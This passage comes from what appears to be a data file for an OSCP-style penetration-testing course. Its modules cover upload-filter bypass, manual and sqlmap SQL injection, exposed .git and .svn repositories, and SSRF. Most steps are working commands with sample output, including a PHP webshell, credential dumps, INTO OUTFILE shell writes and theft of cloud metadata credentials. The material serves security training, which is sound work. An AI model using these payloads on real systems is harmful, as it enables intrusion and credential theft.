shell.php%20, or shell.php::$DATA on IIS. On old PHP a null byte truncates: shell.php%00.jpg. Bypass the exact string the filter checks.","demo":[{"run":"curl -s -F \"file=@shell.pHp\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.pHp\"}","sig":"/uploads/shell.pHp"}],"note":"The filter lower-cased nothing, so .pHp sailed past a check that only looked for \".php\"."},{"t":"Double extensions","d":"An Apache with a loose AddHandler runs anything containing .php, so shell.php.jpg executes while passing a must-end-in-.jpg check. Also try shell.jpg.php, where the app checks the first extension but the server honours the last.","demo":[{"run":"curl -s -F \"file=@shell.php.jpg\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.php.jpg\"}","sig":"shell.php.jpg"},{"run":"curl -s \"http://<target>/uploads/shell.php.jpg?c=whoami\"","out":"www-data","sig":"www-data"}],"note":"The name ends in .jpg (so the whitelist is happy) but contains .php, so Apache runs it."},{"t":"Spoof the Content-Type","d":"If the filter trusts the request's MIME type, change the upload's Content-Type header to image/png while keeping your real payload. This defeats naive checks that believe whatever the client declares.","demo":[{"run":"curl -s -F \"file=@shell.php;type=image/png\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.php\"}","sig":"/uploads/shell.php"}],"note":"The ;type=image/png part sets the MIME the filter checks, while the bytes are still PHP."},{"t":"Forge the magic bytes","d":"When the server inspects file content, prepend real image magic bytes so it looks like an image and still runs: start the file with GIF89a, then your <?php ?> code. A polyglot that is a valid GIF and valid PHP passes content inspection and executes.","demo":[{"run":"printf 'GIF89a;\\n<?php system($_GET[\"c\"]); ?>' > shell.php","out":"(a file that is a valid GIF and valid PHP)","sig":""},{"run":"curl -s -F \"file=@shell.php;type=image/gif\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.php\"}","sig":"/uploads/shell.php"}],"note":"The GIF89a header satisfies a content check; the PHP after it still runs when requested."},{"t":"Abuse .htaccess or web.config","d":"If you can upload a .htaccess (Apache) or web.config (IIS), upload one that tells the server to execute your chosen extension as code, then upload the payload under that extension. This turns an images-only upload into RCE.","demo":[{"run":"echo 'AddType application/x-httpd-php .jpg' > .htaccess","out":"(a rule: run .jpg files as PHP)","sig":""},{"run":"curl -s -F \"file=@.htaccess\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/.htaccess\"}","sig":".htaccess"},{"run":"curl -s -F \"file=@shell.jpg\" http://<target>/upload.php && curl -s \"http://<target>/uploads/shell.jpg?c=id\"","out":"uid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)"}],"note":"First change the rules, then a plain .jpg runs as PHP. Works only where .htaccess is honoured."},{"t":"Find where it landed, then trigger it","d":"An accepted upload is useless if you cannot reach it. A returned id or a predictable /uploads/ path gives you the URL; request it to run your code. If that directory forbids execution, the file may still feed an LFI, XXE, or image-parser bug instead.","demo":[{"run":"curl -s -F \"file=@shell.php\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.php\"}","sig":"/uploads/shell.php"},{"run":"curl -s \"http://<target>/uploads/shell.php?c=id\"","out":"uid=33(www-data) gid=33(www-data) groups=33(www-data)","sig":"uid=33(www-data)"}],"note":"The response told you the path; requesting it runs your code. No path, no shell."}]},
      why: "Reach for this the moment the app exposes anything that takes a file, a profile photo, a document import, an avatar, because it is the shortest route from merely touching the application to running code on the server. When several web bugs are on the table, prefer a promising upload over slower avenues like blind SQL injection: a working upload is often a shell in minutes, where blind extraction is hours of careful queries. It stays worth trying right up until you have a foothold, and it is a staple of exam machines precisely because it rewards patient, methodical filter-testing over luck.",
      cmd: 'curl -s -F "file=@shell.php" http://10.10.10.10/upload.php', tool: 'curl',
      output: [
        '{"status":"ok","stored":"/uploads/shell.php"}',
      ].join('\n'),
      signal: '{"status":"ok","stored":"/uploads/shell.php"}',
      teach: 'The upload accepted a .php file and told you where it landed. If /uploads/ executes PHP, requesting shell.php runs your code, upload-to-webshell. Many filters are weak (check extension tricks, content-type, magic bytes).',
    },
    'sqli-basics': {
      leadup: [{"key":"params","label":"Parameter discovery","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[*] Scanning http://<target>/product.php\n[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A hidden GET parameter feeds a lookup, exactly the kind of value that lands unescaped in a SQL query."}]},{"key":"form","label":"A visible form","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Spot a form while browsing","tool":"curl","where":"local","cmd":"curl -s http://<target>/ | grep -iE 'form action|input name'","out":"<form action=\"/login.php\" method=\"post\">\n  <input name=\"username\"><input name=\"password\">","sig":"action=\"/login.php\"","teach":"A login box is a classic injection target: the username flows straight into a WHERE clause."}]}],
      how: {"lead":"Confirm the injection and pin its type by hand before any tool, because the type decides the whole extraction. Make the database react, then read what kind of reaction you got:","items":[{"t":"Break the query with a quote","d":"A single quote that throws a database error or changes the page is the first tell that your input reaches the SQL unescaped.","demo":[{"run":"curl -s \"http://<target>/product.php?id=1'\"","out":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version","sig":"error in your SQL syntax"}],"note":"An SQL error from one quote is as close to a confession as you get."},{"t":"Confirm with boolean logic","d":"Prove the input reaches the query logically: a true condition returns the normal page, a false one does not. That divergence is boolean-based injection.","demo":[{"run":"curl -s \"http://<target>/product.php?id=1 AND 1=2\"","out":"<h2>No product found</h2>","sig":"No product found"}],"note":"id=1 AND 1=1 shows the product; AND 1=2 hides it. The page obeys your logic."},{"t":"Identify the injection type","d":"Error-based (the DB error prints), UNION-based (you append a SELECT and read columns), boolean-blind (page flips true/false), or time-blind (a SLEEP delays the reply). Each needs a different extraction.","demo":[{"run":"curl -s -o /dev/null -w \"%{time_total}\\n\" \"http://<target>/product.php?id=1 AND SLEEP(5)\"","out":"5.02","sig":"5.02"}],"note":"A 5s delay with no visible change means time-blind: the slowest path, but always available."},{"t":"Fingerprint the database","d":"MySQL, MSSQL, PostgreSQL and Oracle differ in syntax, comments and functions. The version string tells you which dialect your payloads must speak.","demo":[{"run":"curl -s \"http://<target>/product.php?id=1 UNION SELECT @@version-- -\"","out":"8.0.32-0ubuntu0.20.04.2","sig":"8.0.32"}],"note":"A MySQL @@version confirms the dialect so the rest of your payloads use the right syntax."},{"t":"Find the column count","d":"UNION needs the exact column count. Raise ORDER BY until it errors; the last value that works is your count.","demo":[{"run":"curl -s \"http://<target>/product.php?id=1 ORDER BY 4-- -\"","out":"Unknown column '4' in 'order clause'","sig":"Unknown column '4'"}],"note":"ORDER BY 3 works and 4 errors, so the query returns 3 columns: UNION SELECT needs three."}]},
      why: "Confirm SQL injection by hand before you touch a tool, because you cannot exploit (or, on the exam, explain) what you do not understand. A single quote that changes the response, an error, a different result, a timing shift, is the whole signal. Do this the instant a parameter looks like it reaches a database. Getting the injection type right here, error-based, boolean-blind, or time-blind, decides every step that follows, so slow down and read what the app tells you.",
      cmd: "curl -s 'http://10.10.10.10/page.php?id=1%27'", tool: 'curl',
      output: [
        'You have an error in your SQL syntax; check the manual that',
        "corresponds to your MySQL server version for the right syntax near '''",
      ].join('\n'),
      signal: 'You have an error in your SQL syntax; check the manual that',
      teach: 'A single quote that throws a SQL error means your input reaches the query unescaped, the first proof of SQL injection. From here you find the column count and start extracting data (or hand it to sqlmap).',
    },
    'manual-sqli-exploitation': {
      how: {"lead":"A confirmed injection is only the door. Match the columns, fingerprint the account, dump the data, and where the privileges allow, read files and write a shell, all by hand:","items":[{"t":"Find the reflected columns","d":"With the column count known, UNION SELECT a row of numbers to see which positions are echoed on the page. Those carry your extracted data.","demo":[{"run":"curl -s \"http://<target>/product.php?id=0 UNION SELECT 1,2,3-- -\"","out":"<h2>Product: 2</h2><span>price: 3</span>","sig":"Product: 2"}],"note":"Columns 2 and 3 are reflected, so put data there and leave column 1 as filler."},{"t":"Fingerprint version, database, account","d":"Pull the three facts that shape everything next: @@version, database(), current_user(). The account's privileges decide whether file read and write are on the table.","demo":[{"run":"curl -s \"http://<target>/product.php?id=0 UNION SELECT 1,current_user(),database()-- -\"","out":"<h2>Product: app@localhost</h2><span>price: appdb</span>","sig":"app@localhost"}],"note":"You are app@localhost on database appdb; remember the user to check its FILE privilege later."},{"t":"List tables and columns","d":"information_schema is the map. Read information_schema.tables for table names, then information_schema.columns for column names, to find where credentials live.","demo":[{"run":"curl -s \"http://<target>/product.php?id=0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -\"","out":"<h2>Product: products,sessions,users</h2>","sig":"products,sessions,users"}],"note":"A users table is the target; next pull its columns, then its rows."},{"t":"Dump the credentials","d":"group_concat flattens every row into one reflected field. Concatenate the username and password columns with a separator to pull the whole table in a single request.","demo":[{"run":"curl -s \"http://<target>/product.php?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -\"","out":"<h2>Product: admin:21232f297a57a5a743894a0e4a801fc3,jdoe:5f4dcc3b5aa765d61d8327deb882cf99</h2>","sig":"admin:21232f297a57a5a743894a0e4a801fc3"}],"note":"Username:hash pairs for every user, by hand, no sqlmap. Crack them offline next."},{"t":"Extract blind, one char at a time","d":"No reflection? Use an inference oracle. SUBSTRING pulls one character and a timing test confirms its value; iterate position and guess. Slow by hand, which is why you script the loop, not the discovery.","demo":[{"run":"curl -s -o /dev/null -w \"%{time_total}\\n\" \"http://<target>/product.php?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=0x61,SLEEP(3),0)-- -\"","out":"3.01","sig":"3.01"}],"note":"The 3s delay means the first password character is 'a' (0x61). Iterate to recover the string."},{"t":"Read files and write a shell","d":"With the FILE privilege, LOAD_FILE reads local files and INTO OUTFILE writes them. Read /etc/passwd to confirm, then write a one-line PHP shell into the web root to turn data access into code execution.","demo":[{"run":"curl -s \"http://<target>/product.php?id=0 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -\"","out":"<h2>Product: root:x:0:0:root:/root:/bin/bash</h2>","sig":"root:x:0:0"}],"note":"If LOAD_FILE returns the file, the same privilege writes a shell: INTO OUTFILE '/var/www/html/s.php'."}]},
      leadup: [{"key":"confirmed","label":"From a confirmed injection","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A dynamic parameter is the candidate; a single quote will tell you whether it reaches the database unescaped."},{"title":"Confirm the injection","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/product.php?id=1'\"","out":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version","sig":"You have an error in your SQL syntax","teach":"The quote broke the query, so injection is confirmed; from here you extract the data (by hand on the exam)."}]},{"key":"blind","label":"Confirmed blind","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A dynamic parameter is the candidate injection point."},{"title":"Confirm with boolean logic","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/product.php?id=1 AND 1=2\"","out":"<h2>No product found</h2>","sig":"No product found","teach":"id=1 AND 1=1 shows the product while id=1 AND 1=2 does not, so the page reacts to boolean logic: injection confirmed with no error message at all."}]}],
      why: "This is the single most examinable SQL skill, precisely because the exam bans the tool that would otherwise do it for you. Students who only ever run sqlmap freeze the moment it is taken away, so the whole point of this module is fluency under that constraint: taking a database apart by hand fast enough that it is not what costs you the box. Reach for it the instant you have a confirmed injection, and drill the blind path hardest, since it is the slowest to improvise and the easiest to fumble when the clock is running.",
      cmd: "curl -s 'http://10.10.10.10/page.php?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -'", tool: 'curl',
      output: [
        '<h2>Search results</h2>',
        '<div class="row">admin:21232f297a57a5a743894a0e4a801fc3</div>',
        '<div class="row">jdoe:5f4dcc3b5aa765d61d8327deb882cf99</div>',
      ].join('\n'),
      signal: '<div class="row">admin:21232f297a57a5a743894a0e4a801fc3</div>',
      teach: 'The UNION SELECT reflected the username and password columns straight into the page, one row per user, concatenated with a colon. You have extracted every credential in the users table by hand with a single request, no sqlmap involved. Crack the hashes offline, then reuse the recovered passwords to log in.',
    },
    'sqlmap-automation': {
      how: {"lead":"sqlmap automates the extraction you proved by hand, but it is banned on the OSCP exam, so treat it as a lab accelerator only. Feed it a real request, then work in stages:","items":[{"t":"Feed it a captured request","d":"Save the raw request (headers, cookies, body) from Burp to a file and point sqlmap at it with -r. This keeps auth and parameters exactly right, far more reliable than guessing flags.","demo":[{"run":"sqlmap -r request.txt --batch","out":"[INFO] GET parameter 'id' is 'MySQL >= 5.0 error-based' injectable\n[INFO] the back-end DBMS is MySQL","sig":"injectable"}],"note":"--batch takes defaults; sqlmap confirms the very injection you already found by hand."},{"t":"Enumerate in stages","d":"Work down the hierarchy: --dbs, then --tables -D <db>, then --columns, then --dump. Staging keeps your evidence tidy and your request count low.","demo":[{"run":"sqlmap -r request.txt --batch -D appdb --tables","out":"Database: appdb\n+----------+\n| users    |\n| products |\n+----------+","sig":"| users    |"}],"note":"Target the users table next with --dump -T users -D appdb."},{"t":"Dump and crack","d":"--dump pulls the table and even offers to crack hashes with its wordlist. For the exam, remember you must reproduce all of this with UNION/blind by hand.","demo":[{"run":"sqlmap -r request.txt --batch -D appdb -T users --dump","out":"| id | username | password                         |\n| 1  | admin    | 21232f297a57a5a743894a0e4a801fc3 |","sig":"| admin    |"}],"note":"Same credentials as the manual dump; crack the MD5 offline."},{"t":"Escalate to the OS","d":"Where the DB account is privileged, --os-shell drops an interactive OS shell (a staged webshell, or xp_cmdshell on MSSQL), and --file-read/--file-write move files.","demo":[{"run":"sqlmap -r request.txt --batch --os-shell","out":"[INFO] going to use a web backdoor for command execution\nos-shell> id\nuid=33(www-data) gid=33(www-data)","sig":"os-shell>"}],"note":"os-shell is RCE through the injection; it needs a writable web root or a privileged DB account."},{"t":"Beat a WAF with tamper scripts","d":"Blocked? --tamper chains encoders (space2comment, between, charencode) and --random-agent/--delay dodge naive filters and rate limits. Reach for these only after a plain run fails.","demo":[{"run":"sqlmap -r request.txt --batch --tamper=space2comment,between --random-agent","out":"[INFO] WAF/IPS identified as 'ModSecurity: OWASP CRS'\n[INFO] GET parameter 'id' is 'MySQL error-based' injectable (with --tamper)","sig":"injectable (with --tamper)"}],"note":"space2comment and between re-encode the payload so the CRS rules stop matching; pick tampers for the filter you actually saw."}]},
      leadup: [{"key":"confirmed","label":"From a confirmed injection","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A dynamic parameter is the candidate; a single quote will tell you whether it reaches the database unescaped."},{"title":"Confirm the injection","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/product.php?id=1'\"","out":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version","sig":"You have an error in your SQL syntax","teach":"The quote broke the query, so injection is confirmed; from here you extract the data (by hand on the exam)."}]},{"key":"blind","label":"Confirmed blind","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/product.php","out":"[+] Parameter detected: id (GET)","sig":"[+] Parameter detected: id (GET)","teach":"A dynamic parameter is the candidate injection point."},{"title":"Confirm with boolean logic","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/product.php?id=1 AND 1=2\"","out":"<h2>No product found</h2>","sig":"No product found","teach":"id=1 AND 1=1 shows the product while id=1 AND 1=2 does not, so the page reacts to boolean logic: injection confirmed with no error message at all."}]}],
      why: "Once you have confirmed injection by hand, sqlmap automates the tedious part: dumping tables, reading files, sometimes landing a shell. The rule you must internalise is that sqlmap is banned on the OSCP exam, so treat this as a lab-only accelerator and make sure you can do the same extraction manually. Reach for it in labs to save time after you already understand the bug, never as a way to discover bugs you have not verified.",
      cmd: 'sqlmap -r request.txt --batch --level=3 --risk=2 --dump', tool: 'sqlmap',
      output: [
        "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
        '[INFO] the back-end DBMS is MySQL',
        'Database: appdb',
        'Table: users',
        '| id | username | password                         |',
        '| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |',
      ].join('\n'),
      signal: "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
      teach: 'Once you have confirmed injection by hand, sqlmap automates the extraction, it enumerates databases, tables, and dumps rows. Those password hashes go straight to your cracker. Use -r with a saved request so it tests the real parameters.',
    },
    'git-exposed': {
      how: {"lead":"An exposed .git directory is the entire source history. Pull it down, then mine it for secrets and the logic you need to attack next:","items":[{"t":"Dump the repo","d":"git-dumper reconstructs the working tree from the exposed .git, even with directory listing off, by fetching objects by hash.","demo":[{"run":"git-dumper http://<target>/.git/ loot/","out":"[+] Fetching .git/HEAD\n[+] Fetching objects\n[+] Running git checkout .\nloot/  config.php  index.php","sig":"Running git checkout"}],"note":"loot/ now holds the full source; treat it like a whitebox code review."},{"t":"Read the current secrets","d":"Config files in the checkout usually hold database passwords, API keys, and the app's own logic. Grep the tree before anything clever.","demo":[{"run":"grep -riE \"password|secret|api_key|DB_\" loot/ --include=*.php","out":"loot/config.php:  define('DB_PASS', 'Pr0dPassw0rd!');","sig":"DB_PASS"}],"note":"A production DB password in config is often reused for SSH or the admin login."},{"t":"Recover deleted secrets from history","d":"The most valuable secrets are the ones they committed and later 'removed'. git log --all and git show every commit; deleted credentials live forever in the history.","demo":[{"run":"cd loot && git log --all --oneline && git show HEAD~3:config.php | grep -i key","out":"a1b2c3d remove hardcoded AWS key\n    define('AWS_SECRET', 'AKIA...wJalr');","sig":"AWS_SECRET"}],"note":"The commit that 'removed' the AWS key still contains it, three commits back."},{"t":"Map the attack surface","d":"The source names every route, parameter, and auth check, turning blind web testing into targeted exploitation. Read the router and the input handling.","demo":[{"run":"grep -rEn \"Route::|\\$_(GET|POST|REQUEST)\" loot/ | head","out":"loot/run.php:4: system($_POST['cmd']);","sig":"system($_POST['cmd'])"}],"note":"The source just handed you an unauthenticated command-injection endpoint."}]},
      leadup: [{"key":"ferox","label":"Content discovery","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"301      GET  /.git => http://<target>/.git/\n200      GET  /.git/HEAD","sig":"200      GET  /.git/HEAD","teach":"An exposed .git directory means the whole source history is downloadable, including secrets that were committed and later \"deleted\"."}]},{"key":"nikto","label":"A scanner flag","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Run a quick scan","tool":"nikto","where":"local","cmd":"nikto -h http://<target>","out":"+ /.git/config: Git config file found, source may be exposed","sig":"/.git/config","teach":"Nikto flags common exposures like .git on its first pass; treat the hit as a lead to dump the whole repository."}]}],
      why: "A site deployed by git that left its /.git folder readable hands you the entire source history, and history is where secrets hide: a password in an old commit, a config file, an API key someone \"removed\" later but never scrubbed. Check /.git/HEAD on every web app, it is a one-request test with an outsized payoff. When it is there, reconstruct the repo and read the code, you are no longer testing blind.",
      cmd: 'git-dumper http://10.10.10.10/.git/ gitloot', tool: 'git-dumper',
      output: [
        '[+] Testing http://10.10.10.10/.git/HEAD [200]',
        '[+] Fetching .git/ ...',
        '[+] Running git checkout .',
        'Repository reconstructed in gitloot/',
        'config.php:  $db_pass = "SourceOnly2026!";',
      ].join('\n'),
      signal: 'config.php:  $db_pass = "SourceOnly2026!";',
      teach: 'An exposed .git/ directory lets git-dumper reconstruct the whole source tree, including secrets committed by mistake. A database password in config.php is a free credential and a read of exactly how the app works.',
    },
    'svn-exposed': {
      how: {"lead":"Exposed .svn metadata reconstructs the source, including files the developers thought they deleted. Pull it, then mine it like a git exposure:","items":[{"t":"Reconstruct from wc.db","d":"Modern SVN stores paths and checksums in .svn/wc.db (SQLite). Read it to list every file, then fetch each from the pristine store under .svn/pristine/.","demo":[{"run":"curl -s http://<target>/.svn/wc.db -o wc.db && sqlite3 wc.db \"select local_relpath,checksum from nodes\"","out":"config.php|$sha1$ab12...\nbackup.sql|$sha1$ef56...","sig":"config.php|$sha1$"}],"note":"wc.db lists every tracked file and the hash to pull it from .svn/pristine/."},{"t":"Use svn-extractor","d":"A tool automates the wc.db parse and pristine fetch, dropping the full source in one command, the svn equivalent of git-dumper.","demo":[{"run":"python3 svn-extractor.py --url http://<target>/","out":"[+] Found .svn/wc.db\n[+] Extracted 14 files","sig":"Extracted 14 files"}],"note":"You now have the source; grep it for secrets exactly as with a git exposure."},{"t":"Recover deleted files","d":"Files removed from the working copy often remain in the pristine store, so a 'deleted' backup.sql or old config is still downloadable by its hash.","demo":[{"run":"curl -s http://<target>/.svn/pristine/ef/ef56abcd.svn-base | head","out":"-- MySQL dump\nINSERT INTO users VALUES (1,'admin','Pr0dPass');","sig":"INSERT INTO users"}],"note":"The 'removed' database backup is still in the pristine store, credentials and all."},{"t":"Mine for secrets and logic","d":"As with git, the recovered source reveals credentials, routes, and auth checks. Grep first, then read the input handling for exploitable sinks.","demo":[{"run":"grep -riE \"password|secret|key\" . --include=*.php","out":"config.php:  $db_pass = 'S3cr3tDB';","sig":"$db_pass"}],"note":"A recovered config password is often reused for SSH or the admin panel."}]},
      leadup: [{"key":"ferox","label":"Content discovery","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"301      GET  /.svn => http://<target>/.svn/\n200      GET  /.svn/wc.db","sig":"200      GET  /.svn/wc.db","teach":"The .svn metadata (wc.db) lets you reconstruct the source tree and recover files the developers thought they removed."}]},{"key":"nikto","label":"A scanner flag","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Run a quick scan","tool":"nikto","where":"local","cmd":"nikto -h http://<target>","out":"+ /.svn/entries: Subversion metadata found, source may be exposed","sig":"/.svn/entries","teach":"Nikto surfaces .svn the same way it flags .git; the hit is your cue to reconstruct the source tree."}]}],
      why: "The Subversion version of an exposed .git: an old deployment left /.svn/ behind, and its entries and pristine copies rebuild the whole working tree, source and secrets included. It turns up on legacy apps, and there is sometimes an SVN service on 3690 that allows an anonymous checkout. Check it when the stack looks dated or when .git came up empty. Like the git case, it flips you from guessing to reading the real code.",
      cmd: 'curl -s http://10.10.10.10/.svn/entries', tool: 'curl',
      output: [
        '10',
        'dir',
        'https://svn.acme.internal/app',
        'config.php',
        'db_connect.php',
      ].join('\n'),
      signal: 'db_connect.php',
      teach: 'An exposed .svn/ directory leaks the source tree the way .git/ does. The entries file lists real filenames, db_connect.php likely holds database credentials. Reconstruct the files and read them.',
    },
    'ssrf': {
      how: {"lead":"SSRF makes the server fetch URLs for you. Reach what is bound to localhost, read cloud metadata, map the internal network, and beat the filters that try to stop you:","items":[{"t":"Reach an internal-only service","d":"Point the fetch at 127.0.0.1 or an internal host and port. Admin panels and APIs bound to localhost trust 'local' requests, which now originate from you.","demo":[{"run":"curl -s \"http://<target>/fetch?url=http://127.0.0.1:8080/admin\"","out":"<h1>Internal Admin</h1><p>Welcome, service account</p>","sig":"Internal Admin"}],"note":"The app returned a page that is only reachable from the server itself."},{"t":"Steal cloud credentials","d":"On a cloud box, 169.254.169.254 serves instance metadata, including temporary IAM credentials. It is the single highest-value SSRF target.","demo":[{"run":"curl -s \"http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role\"","out":"{\"AccessKeyId\":\"ASIA5EXAMPLE\",\"SecretAccessKey\":\"wJalr...\",\"Token\":\"IQoJ...\"}","sig":"AccessKeyId"}],"note":"Those keys let you talk to the cloud account directly with the aws CLI."},{"t":"Port-scan the internal network","d":"Feed the SSRF a range of internal IPs and ports and watch the status or response time change. Open ports answer differently from closed, mapping the subnet behind the app.","demo":[{"run":"for p in 22 80 3306 6379; do curl -s -o /dev/null -w \"$p %{http_code} %{time_total}\\n\" \"http://<target>/fetch?url=http://10.0.0.5:$p\"; done","out":"22 0 0.01\n80 200 0.04\n3306 0 5.00\n6379 200 0.03","sig":"80 200"}],"note":"A fast 200 on 80 and a 5s stall on 3306 map which internal ports are open."},{"t":"Beat the filter","d":"Blocked 127.0.0.1? Try 0, 127.1, 2130706433 (decimal), [::1], or a domain you own that resolves to it. Allow-listed by domain? Use user@, a # fragment, or an open redirect on the allowed host.","demo":[{"run":"curl -s \"http://<target>/fetch?url=http://2130706433/admin\"","out":"<h1>Internal Admin</h1>","sig":"Internal Admin"}],"note":"2130706433 is 127.0.0.1 as one integer, which naive 127.* string filters miss."},{"t":"Smuggle another protocol","d":"Where the fetcher honours more than http, file:// reads local files directly and gopher:// crafts raw TCP to hit Redis, MySQL, or SMTP, which can become RCE.","demo":[{"run":"curl -s \"http://<target>/fetch?url=file:///etc/passwd\"","out":"root:x:0:0:root:/root:/bin/bash","sig":"root:x:0:0"}],"note":"If file:// works, SSRF just became arbitrary file read; gopher:// to Redis can become RCE."}]},
